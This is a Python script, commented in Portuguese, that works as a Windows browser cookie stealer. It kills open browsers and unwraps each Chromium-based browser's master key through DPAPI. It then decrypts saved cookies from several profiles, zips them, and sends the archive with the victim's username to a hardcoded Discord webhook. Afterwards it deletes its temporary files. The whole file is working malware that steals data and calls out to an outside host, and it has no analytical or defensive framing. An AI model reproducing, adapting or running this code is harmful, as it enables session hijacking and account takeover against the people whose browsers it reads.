import base64
import json
import os
import random
import sqlite3
import zipfile
import requests
import psutil
from shutil import copy2
from getpass import getuser
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# CONFIGURAÇÃO
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1562627473756258324/Aq_h-bGlSYRPFKhJMCyuhxmlSlUOa3RevLbkmgXAB_Ad4DOYsRi99-LmBWueKONJcHYC"

def send_to_discord(file_path):
    try:
        with open(file_path, "rb") as f:
            payload = {"content": f"📦 Cookies extraídos de: {getuser()}"}
            files = {"file": ("cookies.zip", f)}
            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
    except Exception as e:
        print(f"Erro ao enviar: {e}")

def create_temp():
    tmp_dir = os.path.join(os.getenv('TEMP'), 'sys_cache')
    if not os.path.exists(tmp_dir):
        os.makedirs(tmp_dir)
    file_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))
    return os.path.join(tmp_dir, file_name)

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "msedge.exe", "vivaldi.exe"]
        
        self.browsers = {
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

        # Fecha navegadores para liberar o arquivo de banco de dados (lock)
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() in self.browser_exe:
                    proc.kill()
            except:
                pass

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except:
            return None

    def decrypt_value(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        except:
            return ""

    def grab_cookies(self):
        output_file = os.path.join(os.getenv('TEMP'), 'cookies_raw.txt')
        if os.path.exists(output_file):
            os.remove(output_file)

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            master_key = self.get_master_key(os.path.join(path, 'Local State'))
            if not master_key: continue

            for profile in self.profiles:
                cookie_path = os.path.join(path, profile, 'Network', 'Cookies') if 'opera' not in name else os.path.join(path, 'Network', 'Cookies')
                
                if not os.path.isfile(cookie_path):
                    continue

                temp_db = create_temp()
                copy2(cookie_path, temp_db)
                
                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    with open(output_file, 'a', encoding="utf-8") as f:
                        f.write(f"\n--- Browser: {name} | Profile: {profile} ---\n")
                        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
                        for host, c_name, c_path, enc_val, expires in cursor.fetchall():
                            val = self.decrypt_value(enc_val, master_key)
                            if val:
                                f.write(f"{host}\t{'TRUE' if expires != 0 else 'FALSE'}\t{c_path}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{c_name}\t{val}\n")
                    conn.close()
                except:
                    pass
                finally:
                    os.remove(temp_db)

        return output_file

def main():
    # 1. Extração
    b = Browsers()
    raw_txt = b.grab_cookies()

    if os.path.exists(raw_txt):
        # 2. Compactação
        zip_path = os.path.join(os.getenv('TEMP'), 'cookies.zip')
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(raw_txt, arcname='cookies.txt')
        
        # 3. Envio
        send_to_discord(zip_path)
        
        # Limpeza
        os.remove(raw_txt)
        os.remove(zip_path)

if __name__ == "__main__":
    main()
